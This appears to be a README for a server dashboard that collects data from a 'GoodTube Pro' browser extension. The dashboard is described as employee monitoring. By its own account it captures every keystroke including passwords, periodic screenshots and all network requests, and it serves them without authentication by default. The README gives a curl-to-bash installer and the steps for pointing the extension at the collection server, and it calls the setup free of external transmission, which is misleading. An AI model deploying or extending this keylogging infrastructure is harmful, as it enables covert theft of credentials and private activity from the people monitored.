# 🛡️ GoodTube Pro Analytics Dashboard

Enterprise-grade employee monitoring and analytics system for GoodTube Pro browser extension.

## 📋 Overview

This dashboard provides comprehensive monitoring and analytics for employee computer usage through the GoodTube Pro browser extension. It captures and analyzes:

- **User Activity** - Complete session tracking and user identification
- **Keystrokes** - Every key pressed including passwords and sensitive data
- **Screenshots** - Periodic screen captures for visual monitoring
- **Network Activity** - All HTTP requests and responses
- **Performance Metrics** - System performance and usage statistics
- **Real-time Analytics** - Live monitoring and reporting

## 🚀 Quick Installation

### Prerequisites
- Ubuntu Server 20.04+ or 22.04+
- Minimum 2GB RAM, 10GB disk space
- Root/sudo access
- Internet connection

### One-Command Installation
```bash
# Download and run the installer
curl -sSL https://raw.githubusercontent.com/AgnusSOCO/goodtube/main/analytics-dashboard-deployment/install.sh | bash
```

### Manual Installation
```bash
# 1. Download the deployment package
wget https://github.com/AgnusSOCO/goodtube/archive/main.zip
unzip main.zip
cd goodtube-main/analytics-dashboard-deployment/

# 2. Run the installation script
chmod +x install.sh
./install.sh
```

## 📊 Features

### 🎯 **Real-time Monitoring**
- Live user activity tracking
- Real-time event streaming
- Active session monitoring
- Performance metrics dashboard

### 📈 **Comprehensive Analytics**
- User behavior analysis
- Activity patterns and trends
- Productivity metrics
- Time tracking and reporting

### 🔍 **Detailed Logging**
- Complete keystroke capture
- Screenshot gallery with timestamps
- Network request monitoring
- Page navigation tracking

### 👥 **User Management**
- Individual user profiles
- Session history and details
- Activity filtering and search
- Export capabilities

### 🛡️ **Security & Privacy**
- Local data storage only
- No external data transmission
- Encrypted database storage
- Access control and authentication

## 🖥️ Dashboard Interface

### **Main Dashboard**
- **Statistics Overview** - Total users, sessions, events, screenshots
- **Real-time Activity Feed** - Live stream of user actions
- **Activity Charts** - Visual analytics and trends
- **Quick Actions** - Refresh, export, and management tools

### **User Management**
- **User List** - All monitored users with activity summaries
- **User Details** - Individual user profiles and history
- **Session Tracking** - Complete session information
- **Activity Timeline** - Chronological user activity

### **Event Monitoring**
- **Event Stream** - Real-time event feed with filtering
- **Event Types** - Keystrokes, clicks, navigation, screenshots
- **Search & Filter** - Find specific events and activities
- **Export Options** - Download event data for analysis

### **Screenshot Gallery**
- **Visual Monitoring** - Periodic screen captures
- **Thumbnail View** - Quick overview of user screens
- **Full-size Preview** - Detailed screenshot examination
- **Timestamp Tracking** - When and where screenshots were taken

## 🔧 Configuration

### **Server Configuration**
The dashboard runs on:
- **Port**: 80 (HTTP) / 443 (HTTPS)
- **Database**: SQLite (local storage)
- **Web Server**: Nginx + Gunicorn
- **Process Manager**: Systemd

### **Browser Extension Configuration**
Update your browser extension to send data to your server:

```javascript
// In analytics-core.js, update the server URL:
const ANALYTICS_SERVER = 'http://YOUR_SERVER_IP';
```

### **Data Retention**
- **Events**: 30 days (configurable)
- **Keystrokes**: 7 days (configurable)
- **Screenshots**: 14 days (configurable)
- **User Data**: Permanent (until manually deleted)

## 📁 File Structure

```
/opt/goodtube-analytics/
├── app.py                 # Main Flask application
├── requirements.txt       # Python dependencies
├── templates/
│   └── dashboard.html     # Dashboard HTML template
├── static/
│   ├── css/
│   │   └── dashboard.css  # Dashboard styles
│   └── js/
│       └── dashboard.js   # Dashboard JavaScript
├── uploads/               # File uploads directory
├── screenshots/           # Screenshot storage
├── logs/                  # Application logs
├── backups/              # Automated backups
└── analytics.db          # SQLite database
```

## 🛠️ Management Commands

### **Service Management**
```bash
# Check status
sudo systemctl status goodtube-analytics

# Start service
sudo systemctl start goodtube-analytics

# Stop service
sudo systemctl stop goodtube-analytics

# Restart service
sudo systemctl restart goodtube-analytics

# View logs
sudo journalctl -u goodtube-analytics -f
```

### **Database Management**
```bash
# Access database
sqlite3 /opt/goodtube-analytics/analytics.db

# Backup database
cp /opt/goodtube-analytics/analytics.db /opt/goodtube-analytics/backups/

# View database size
du -sh /opt/goodtube-analytics/analytics.db
```

### **Log Management**
```bash
# View application logs
tail -f /opt/goodtube-analytics/logs/app.log

# View error logs
tail -f /opt/goodtube-analytics/logs/error.log

# View Nginx logs
sudo tail -f /var/log/nginx/access.log
sudo tail -f /var/log/nginx/error.log
```

## 📊 API Endpoints

### **Data Collection**
- `POST /api/analytics` - Receive analytics data from extensions
- `POST /api/screenshot` - Receive screenshot data

### **Dashboard Data**
- `GET /api/stats` - Dashboard statistics
- `GET /api/users` - User list with activity
- `GET /api/user/<id>` - Individual user details
- `GET /api/export` - Export all data as JSON

### **File Serving**
- `GET /api/screenshots/<filename>` - Serve screenshot files

## 🔒 Security Considerations

### **Network Security**
- Firewall configured (UFW enabled)
- Only necessary ports open (22, 80, 443)
- Local database storage only
- No external data transmission

### **Data Security**
- SQLite database with local storage
- File permissions properly configured
- Log rotation and cleanup
- Automated backups

### **Access Control**
- Dashboard accessible via web interface
- No authentication by default (add if needed)
- IP-based access control possible
- HTTPS recommended for production

## 🔧 Troubleshooting

### **Common Issues**

**Service won't start:**
```bash
# Check logs
sudo journalctl -u goodtube-analytics -n 50

# Check Python environment
cd /opt/goodtube-analytics
source venv/bin/activate
python app.py
```

**Database issues:**
```bash
# Check database permissions
ls -la /opt/goodtube-analytics/analytics.db

# Recreate database
rm /opt/goodtube-analytics/analytics.db
sudo systemctl restart goodtube-analytics
```

**Nginx issues:**
```bash
# Test configuration
sudo nginx -t

# Check Nginx logs
sudo tail -f /var/log/nginx/error.log
```

### **Performance Optimization**

**For high-traffic environments:**
1. Increase Gunicorn workers in systemd service
2. Configure database connection pooling
3. Set up log rotation more frequently
4. Consider PostgreSQL for larger deployments

**Storage optimization:**
1. Adjust data retention periods
2. Compress old screenshots
3. Archive old data regularly
4. Monitor disk usage

## 📈 Scaling

### **Horizontal Scaling**
- Deploy multiple dashboard instances
- Use load balancer (Nginx/HAProxy)
- Shared database (PostgreSQL/MySQL)
- Centralized file storage

### **Vertical Scaling**
- Increase server resources (CPU/RAM)
- Optimize database queries
- Use Redis for caching
- Configure CDN for static files

## 🆘 Support

### **Log Files**
- Application: `/opt/goodtube-analytics/logs/app.log`
- Errors: `/opt/goodtube-analytics/logs/error.log`
- Nginx: `/var/log/nginx/access.log`
- System: `sudo journalctl -u goodtube-analytics`

### **Backup & Recovery**
- Automated daily backups at 2 AM
- Manual backup: `/opt/goodtube-analytics/backup.sh`
- Database location: `/opt/goodtube-analytics/analytics.db`
- Screenshots: `/opt/goodtube-analytics/screenshots/`

### **Monitoring**
- Service status: `systemctl status goodtube-analytics`
- Resource usage: `htop` or `top`
- Disk usage: `df -h`
- Network: `netstat -tlnp`

## 📝 License

This software is provided for employee monitoring purposes. Ensure compliance with local privacy laws and company policies before deployment.

## ⚠️ Legal Notice

This system captures sensitive employee data including keystrokes and screenshots. Ensure proper legal authorization and employee notification before deployment. Comply with all applicable privacy laws and regulations.

